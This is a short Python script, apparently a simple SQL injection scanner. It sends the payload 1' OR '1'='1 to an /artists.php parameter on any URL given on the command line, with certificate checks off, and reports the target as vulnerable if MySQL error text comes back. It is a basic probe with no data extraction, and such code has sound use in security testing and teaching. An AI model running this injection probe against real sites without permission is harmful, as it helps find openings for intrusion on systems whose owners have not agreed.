import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import sys
import json

def ensure_url_scheme(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url

def test_sqli(base_url):
    # Ensure URL has scheme
    base_url = ensure_url_scheme(base_url)
    
    # Define the endpoint with a known parameter
    path = "/artists.php"
    params = {"artist": "1' OR '1'='1"}

    # Build full test URL
    test_url = f"{base_url.rstrip('/')}{path}?" + urlencode(params)

    headers = {
        'User-Agent': 'Mozilla/5.0'
    }

    try:
        r = requests.get(test_url, headers=headers, timeout=10, verify=False)
        
        result = {
            "target": base_url,
            "test_url": test_url,
            "status_code": r.status_code,
            "vulnerable": any(error in r.text.lower() for error in [
                "mysql", "syntax error", "you have an error in your sql"
            ])
        }

        if result["vulnerable"]:
            result["message"] = "Vulnerable to SQL Injection!"
        else:
            result["message"] = "Not vulnerable (based on this test)."

        print(json.dumps(result))
    except Exception as e:
        error_result = {
            "error": str(e),
            "target": base_url
        }
        print(json.dumps(error_result))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(json.dumps({"error": "Please provide a target URL"}))
        sys.exit(1)
    
    url = sys.argv[1]
    test_sqli(url)
